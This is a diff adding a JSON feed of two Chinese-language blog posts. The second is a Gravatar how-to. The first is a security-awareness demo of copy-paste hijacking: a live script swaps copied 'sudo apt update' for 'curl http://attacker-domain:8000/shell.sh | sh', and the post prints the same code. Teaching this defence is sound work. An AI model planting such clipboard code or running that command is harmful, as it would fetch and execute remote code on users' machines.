@@ -1,0 +1,30 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "筆記ZONE • All posts by \"網路資源\" category",
+    "description": "",
+    "home_page_url": "https://zonego.tw",
+    "items": [
+        {
+            "id": "https://zonego.tw/2022/04/27/copy-past/",
+            "url": "https://zonego.tw/2022/04/27/copy-past/",
+            "title": "注意複製貼上內容",
+            "date_published": "2022-04-27T11:44:03.000Z",
+            "content_html": "<span id=\"more\"></span>\n<h2 id=\"注意複製貼上內容\"><a href=\"#注意複製貼上內容\" class=\"headerlink\" title=\"注意複製貼上內容\"></a>注意複製貼上內容</h2><p>我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!</p>\n<p>複製這個指令試試看</p>\n<p id=\"copy\">sudo apt update</p>\n\n<script>\ndocument.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\\n'); e.preventDefault(); });\n</script>\n\n<p>把剛剛複製的貼這邊</p>\n<textarea style=\"height: 100px; min-height: 100px; width:100%; resize: none;\" cols=\"30\" name=\"textarea\" rows=\"5\" placeholder=\"Paste your safe text here...\"></textarea>\n\n\n<p>中間的奧秘就是用 JavaScript 達到改寫複製的內容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">&#x27;copy&#x27;</span>).addEventListener(<span class=\"hljs-string\">&#x27;copy&#x27;</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) </span>&#123; <br>    e.clipboardData.setData(<span class=\"hljs-string\">&#x27;text/plain&#x27;</span>, <span class=\"hljs-string\">&#x27;curl http://attacker-domain:8000/shell.sh | sh\\n&#x27;</span>); <br>    e.preventDefault(); <br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>所以，在貼上之前記得先貼到記事本檢查，<strong>不要直接貼到終端機使用</strong></p>\n<h3 id=\"來源\"><a href=\"#來源\" class=\"headerlink\" title=\"來源\"></a>來源</h3><p><a href=\"https://www.wizer-training.com/blog/copy-paste\">https://www.wizer-training.com/blog/copy-paste</a></p>\n",
+            "tags": [
+                "資安",
+                "網路資源"
+            ]
+        },
+        {
+            "id": "https://zonego.tw/2021/11/22/gravatar/",
+            "url": "https://zonego.tw/2021/11/22/gravatar/",
+            "title": "大頭貼服務 Gravatar",
+            "date_published": "2021-11-22T08:30:59.000Z",
+            "content_html": "<p>辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上串大頭貼的問題! (希望可以…)</p>\n<h2 id=\"Gravatar\"><a href=\"#Gravatar\" class=\"headerlink\" title=\"Gravatar\"></a>Gravatar</h2><p><a href=\"https://gravatar.com/\">Gravatar</a> 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。<br>只需在這邊設定完大頭貼，就可以一次套用。</p>\n<p>除了提供大頭貼，Gravatar 也提供類似線上名片的功能。<br>你可以在上面放你的網站、email等公開資訊。 <del>不過我沒在用</del></p>\n<h3 id=\"使用大頭貼\"><a href=\"#使用大頭貼\" class=\"headerlink\" title=\"使用大頭貼\"></a>使用大頭貼</h3><p>參考<a href=\"https://en.gravatar.com/site/implement\">官方文件</a>的使用方法</p>\n<p>裡面有個方便的用法：取得大頭貼的大頭貼的URL<br>有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入</p>\n<p><del>如果不能用，一定是你還沒上傳大頭貼</del></p>\n<p>大頭貼的網址長這樣，<code>HASH</code>的部分要替換成email的md5 hash值</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">https:<span class=\"hljs-regexp\">//</span>www.gravatar.com<span class=\"hljs-regexp\">/avatar/</span>HASH<br></code></pre></td></tr></table></figure>\n\n<p>如果不知道怎麼找對應的hash值，可以在<a href=\"http://www.md5.cz/\">這裏</a>產生對應的產生對應的md5 hash</p>\n<p>例如我email的hash值找到是 <code>0b1d2b9d95375cc6af5909e145fb4a06</code><br>我的大頭貼網址就是</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">https</span>://www.gravatar.com/avatar/<span class=\"hljs-number\">0</span>b<span class=\"hljs-number\">1</span>d<span class=\"hljs-number\">2</span>b<span class=\"hljs-number\">9</span>d<span class=\"hljs-number\">95375</span>cc<span class=\"hljs-number\">6</span>af<span class=\"hljs-number\">5909</span>e<span class=\"hljs-number\">145</span>fb<span class=\"hljs-number\">4</span>a<span class=\"hljs-number\">06</span><br></code></pre></td></tr></table></figure>\n\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06\" alt=\"大頭貼\" class=\"lazyload\"></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><code class=\"hljs markdown\">![<span class=\"hljs-string\">大頭貼</span>](<span class=\"hljs-link\">https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06</span>)<br></code></pre></td></tr></table></figure>\n",
+            "tags": [
+                "網路資源",
+                "Blog"
+            ]
+        }
+    ]
+}
